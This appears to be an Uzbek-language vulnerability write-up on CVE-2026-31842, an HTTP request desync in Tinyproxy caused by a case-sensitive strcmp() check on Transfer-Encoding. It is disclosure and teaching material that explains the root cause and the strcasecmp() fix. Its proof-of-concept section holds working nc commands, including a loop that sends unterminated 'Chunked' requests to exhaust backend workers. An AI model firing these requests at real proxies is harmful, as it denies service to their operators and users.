---
title: "Bitta katta harf: Tinyproxy'da HTTP desinxronizatsiyasi (CVE-2026-31842)"
date: 2026-08-14T11:00:00+05:00
tags: ["http-desync", "request-smuggling", "writeup", "cve"]
slug: "tinyproxy-transfer-encoding-desync"
translationKey: tinyproxy-desync
draft: false
summary: "Tinyproxy Transfer-Encoding'ni strcmp() bilan solishtiradi, shuning uchun `Chunked` undan o'tib ketadi, backend esa uni tan oladi — katta-kichik harf xatosi request desinxronizatsiyasiga aylanadi."
---

Bu safar butun gap bitta belgida. Tinyproxy so'rov chunked ekanini `Transfer-Encoding`
sarlavhasini `chunked` degan aynan matn bilan solishtirib aniqlaydi — `strcmp()` orqali, u esa
katta-kichik harfni farqlaydi. Katta C bilan `Chunked` yuborsang, proxy "chunked emas" deydi,
uning orqasidagi backend esa "chunked" deydi. Shu kelishmovchilik — request desinxronizatsiyasi,
va u **CVE-2026-31842** sifatida ro'yxatga olingan.

Bu yerga tushadigan boshqa narsalardan farqli o'laroq, bu ochiq — CVE bor va
[ochiq PoC](https://github.com/MuxammadiyevG/Vulns_POC/tree/main/CVE-2026-31842) bor — shuning
uchun hech narsa yashirilmagan. To'liq tafsilot pastda.

## Fon: nega ikki parserning kelishmasligi xavfli

Proxy klient bilan backend o'rtasida turadi. Ikkovi ham bir xil ulanishdan bir xil baytlarni
o'qiydi va bitta savolga javob berishi kerak: **bu so'rov qayerda tugaydi, keyingisi qayerda
boshlanadi?** Ular bu savolga bir xil javob bergunicha hammasi joyida. Boshqacha javob bergan
zahoti — senda request smuggling paydo bo'ladi.

HTTP tananing qayerda tugashini belgilashning ikki yo'lini beradi:

- **`Content-Length: N`** — tana aynan N bayt.
- **`Transfer-Encoding: chunked`** — tana uzunlik-prefiksli bo'laklarda keladi va nol uzunlikli
  bo'lak bilan tugaydi (`0\r\n\r\n`).

Agar so'rov ikki xil o'qilishi mumkin bo'lgan signallar olib yursa, va proxy birontasiga ishonsa,
backend esa boshqasiga, ulanishning ikki uchi bayt oqimini turli nuqtalarda kesadi. Proxy
"keyingi so'rov" deb o'ylagan baytlarni backend oldingisiga yopishtiradi — yoki backend proxy
kelmaydi deb hal qilib bo'lgan tanani kutib o'tiraveradi. Ikkala natija ham yomon, turlicha
yomon.

## Chunked aslida qanday ko'rinadi

Oddiy chunked tana:

```http
POST / HTTP/1.1
Host: backend
Transfer-Encoding: chunked

5\r\n
hello\r\n
0\r\n
\r\n
```

`5` "besh bayt kelyapti" deydi, keyin `hello`, keyin `0` "boshqa bo'lak yo'q" deydi. Server
nol-uzunlikli bo'lakni ko'rganda so'rov tugaganini biladi. Tugatuvchi `0\r\n\r\n` ni olib
tashla — so'rovni chunked deb biladigan server tananing qolganini kutadi — abadiy, yoki
timeout bo'lgunicha.

## Ildiz sabab

Tinyproxy "bu chunkedmi?" degan qarorni `src/reqs.c` da qabul qiladi:

```c
// src/reqs.c:815
return data ? !strcmp (data, "chunked") : 0;
```

`strcmp()` faqat aynan bayt-baytga mos kelganda 0 qaytaradi, shuning uchun
`!strcmp(data, "chunked")` **faqat** aynan kichik harfli `chunked` matni uchun rost bo'ladi.
Unga `Chunked`, `CHUNKED` yoki `cHuNkEd` bersang, u noldan boshqa qiymat qaytaradi — Tinyproxy
so'rov chunked *emas* degan xulosaga keladi.

Butun bug shu. RFC 7230 §4 transfer-coding nomlari katta-kichik harfga befarq ekanini aniq
aytadi; `Chunked` — uni yozishning mutlaqo yaroqli usuli. Talabga mos backend — nginx, Node'ning
HTTP serveri, deyarli hamma narsa — `Chunked` ni aynan `chunked` kabi qabul qiladi. Tinyproxy
esa yo'q. Endi ikkovi tananing umuman chunked ekani haqida kelishmaydi.

```goat
                 Transfer-Encoding: Chunked
                            |
              .-------------+--------------.
              v                            v
        .-----------.                .-----------.
        | Tinyproxy |                |  backend  |
        | strcmp -> |                | harfga    |
        | chunked   |                | befarq -> |
        | EMAS      |                | chunked   |
        '-----------'                '-----------'
              |                            |
        tanani Content-           tugamaydigan bo'laklarni
        Length bo'yicha o'qiydi    kutadi
        yoki o'zgartirmay uzatadi
```

## Birinchi oqibat: xavfsizlik filtrini chetlab o'tish

So'rov tanasini tushunish uchun Tinyproxy'ga tayanadigan har narsa Tinyproxy'ning ko'r nuqtasini
meros oladi. Proxy yo'lining oldida — yoki ichida — turgan WAF yoki filtr o'zining ruxsat/bloklash
qarorini tanaga *proxy* uni qanday shakllantirgan bo'lsa, shunga qarab qabul qiladi. Agar proxy
`Chunked` so'rovni noto'g'ri shakllantirsa, filtr noto'g'ri baytlarni tekshiradi, va to'g'ri
parse qilingan so'rovda bloklanadigan kontent proxy noto'g'ri o'qigan qismda o'tib ketishi
mumkin. Katta harf — tekshiruvdan tana kontentini yashirib o'tkazish usuli.

## Ikkinchi oqibat: xizmatni rad etish (DoS)

Bu oson va ishonchli variant. `Transfer-Encoding: Chunked` deydigan, lekin hech qachon tugatuvchi
bo'lak yubormaydigan so'rov jo'nat:

- **Backend** `Chunked` ni harfga befarq o'qiydi, chunked tana kelayapti deb ishonadi, va hech
  qachon kelmaydigan `0\r\n\r\n` ni kutib bloklanadi.
- O'sha backend ishchisi (worker) endi ulanishni ochiq ushlab qotib qoladi.

Buni takrorla. Har qotgan so'rov bitta ishchi oqimini band qiladi. Oz sonli ulanish bilan
backend'ning ishchilar hovuzini tugatasan, va qonuniy so'rovlarga joy qolmaydi — resurslar tanqisligi, crash talab qilinmaydi.

## Proof of concept

**[PoC videosini ko'r](https://drive.google.com/file/d/14jDqzQhiIRUoYyca22zx9gANj3JwDEC2/view)** — to'liq jarayon, proxy va backend yonma-yon.

Ikki server: HTTP/1.1 chunked gapiradigan backend, va uning oldida Tinyproxy.

**Backend** — so'rov tugaganda buni chop etadigan minimal Node server, shunda uning
qotishini kuzatasan:

```js
// backend.js — :9000 da tinglaydi
const http = require('http');
http.createServer((req, res) => {
  let n = 0;
  req.on('data', c => { n += c.length; });
  req.on('end', () => {           // faqat tana to'liq qabul qilinganda ishlaydi
    console.log(`so'rov tugadi, ${n} bayt tana`);
    res.end('ok\n');
  });
}).listen(9000, () => console.log('backend :9000 da'));
```

**Tinyproxy** — uni backend'ga yo'naltir va :8888 da ishga tushir (zaif build, ya'ni
`src/reqs.c:815` da `strcmp` bo'lgani).

**Asos holat — kichik harfli `chunked`, tugatuvchi bo'laksiz:**

```bash
printf 'POST / HTTP/1.1\r\nHost: 127.0.0.1:9000\r\nTransfer-Encoding: chunked\r\n\r\n' \
  | timeout 5 nc 127.0.0.1 8888
```

Tinyproxy buni ham chunked deb o'qiydi, shakllashni o'zi hal qiladi, va almashinuv toza
yakunlanadi. Bir xil parse, desync yo'q.

**Ekspluatatsiya — katta harfli `Chunked`, tugatuvchi bo'laksiz:**

```bash
printf 'POST / HTTP/1.1\r\nHost: 127.0.0.1:9000\r\nTransfer-Encoding: Chunked\r\n\r\n' \
  | timeout 30 nc 127.0.0.1 8888
```

Endi Tinyproxy'ning `strcmp` i katta `C` ni sezmaydi, shuning uchun so'rovni chunked deb
*qabul qilmaydi* va uni oldinga uzatadi. Backend esa uni chunked deb qabul qiladi va hech
qachon kelmaydigan bo'laklarni kutib bloklanadi. Sening `backend.js` ing hech qachon
`so'rov tugadi` deb chop etmaydi — ulanish timeout bo'lguncha qotib turadi. O'sha qotish —
topilma.

Bir nechtasini parallel otib, backend'ning boshqa hech narsaga javob bermay qolishini kuzat:

```bash
for i in $(seq 1 20); do
  printf 'POST / HTTP/1.1\r\nHost: 127.0.0.1:9000\r\nTransfer-Encoding: Chunked\r\n\r\n' \
    | nc 127.0.0.1 8888 &
done
```

## Tuzatish

Bitta funksiya chaqiruvi. Harfga befarq solishtirish, RFC boshidan talab qilgani:

```c
// oldin
return data ? !strcmp (data, "chunked") : 0;
// keyin
return data ? !strcasecmp (data, "chunked") : 0;
```

Bu bir qatordan uzoqroq yashaydigan umumiy saboq: **HTTP sarlavhasini matn sifatida solishtirib
xavfsizlik yoki shakllash qarorini qabul qiladigan har qanday kod buni harfga befarq qilishi
kerak.** Sarlavha maydon nomlari va aniqlangan qiymatlarning ko'pi spetsifikatsiya bo'yicha
harfga befarq, va buni unutgan proxy ertami-kechmi orqasidagi server bilan kelishmay qoladi.
Bitta ulanishda ikki HTTP parserning kelishmasligi hech qachon bezak masalasi emas — bu request
smuggling'ning xom ashyosi.

## Tafsilotlar

- **Zaiflik:** katta-kichik harfni farqlaydigan `Transfer-Encoding` solishtiruvi orqali HTTP
  request desinxronizatsiyasi
- **Komponent:** Tinyproxy, `src/reqs.c` (transfer-coding qiymatida `strcmp`)
- **Klass:** CWE-444 — HTTP so'rovlarining nomuvofiq talqini
- **Ta'sir:** xavfsizlik filtrini chetlab o'tish (tana tekshiruvdan yashirib o'tkaziladi);
  xizmatni rad etish (tugamaydigan chunked tanalar orqali ishchilarni tugatish)
- **Tuzatish:** `strcmp()` o'rniga `strcasecmp()`
- **CVE:** CVE-2026-31842
- **PoC:** <https://github.com/MuxammadiyevG/Vulns_POC/tree/main/CVE-2026-31842>
- **Video:** <https://drive.google.com/file/d/14jDqzQhiIRUoYyca22zx9gANj3JwDEC2/view>
